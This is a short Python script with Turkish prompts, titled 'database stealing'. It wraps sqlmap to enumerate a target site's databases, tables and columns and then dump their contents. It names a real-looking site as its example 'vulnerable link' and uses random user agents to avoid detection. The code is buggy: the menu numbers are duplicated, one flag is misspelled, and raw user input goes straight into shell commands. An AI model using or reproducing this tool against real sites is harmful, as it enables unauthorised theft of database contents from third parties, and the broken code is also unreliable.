#!/usr/bin/env python

import os

os.system("apt-get install figlet")
os.system("clear")
os.system("figlet VERI TABANI CALMA")

print("""

Veri Tabani Calma Aracina Hos Geldiniz...

1) Sadece Acikli Linki Biliyorum
2) Acikli linki, Veritabani adini biliyorum
3) Acikli linki, Veritabani adini, tablo Adini biliyorum
3) Acikli linki, Veritabani adini, tablo, Colon Adini biliyorum

Ornek Acikli link : http://www.suesupriano.com/article.php?id=25


	""")
islemno = raw_input("Islem Numarasini Girin: ")
if(islemno=="1"):
	aciklilink = raw_input("Acikli Link Girin: ")
	os.system("sqlmap -u " + aciklilink + " --dbs --random-agent")
elif(islemno=="2"):
	aciklilink = raw_input("Acikli Link Girin: ")
	veritabani = raw_input("veritabani Adini Girin: ")
	os.system("sqlmap -u " + aciklilink + " -D " + veritabani + " --tables --random-agent")
elif(islemno=="3"):
	aciklilink = raw_input("Acikli Link Girin: ")
	veritabani = raw_input("veritabani Adini Girin: ")
	tablo 	   = raw_input("Tablo adini Girin: ")
	os.system("sqlmap -u " + aciklilink + " -D " + veritabani + " -T " + tablo + " --colmns --random-agent")
elif(islemno=="4"):
	aciklilink = raw_input("Acikli Link Girin: ")
	veritabani = raw_input("veritabani Adini Girin: ")
	tablo 	   = raw_input("Tablo adini Girin: ")
	colon 	   = raw_input("Colon adini Girin: ")
	os.system("sqlmap -u " + aciklilink + " -D " + veritabani + " -T " + tablo + " -C " + colon + " --dump --random-agent")
else:
	print("hatali secim")
	
